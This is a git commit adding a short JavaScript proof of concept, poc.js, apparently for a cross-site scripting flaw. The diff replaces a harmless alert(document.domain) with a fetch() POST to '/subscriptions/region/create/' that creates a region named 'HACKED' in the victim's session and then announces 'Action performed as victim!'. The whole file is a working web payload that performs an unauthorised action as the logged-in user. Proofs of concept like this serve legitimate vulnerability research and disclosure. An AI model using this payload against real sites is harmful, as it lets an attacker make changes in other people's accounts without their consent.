eae7aa20f021ed25c2f0f53c283ca16c94b542a6
AusShock <102188905+AusShock@users.noreply.github.com>
2026-02-05 20:39:52 +0100

    poc.js

--- poc.js
+++ poc.js
@@ -1,1 +1,5 @@
-alert(document.domain)
+fetch('/subscriptions/region/create/', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+  body: 'regionName=HACKED&description=XSS&mapCenter=on&north=90&south=-90&east=180&west=-180'
+}).then(r => alert('Action performed as victim!'));
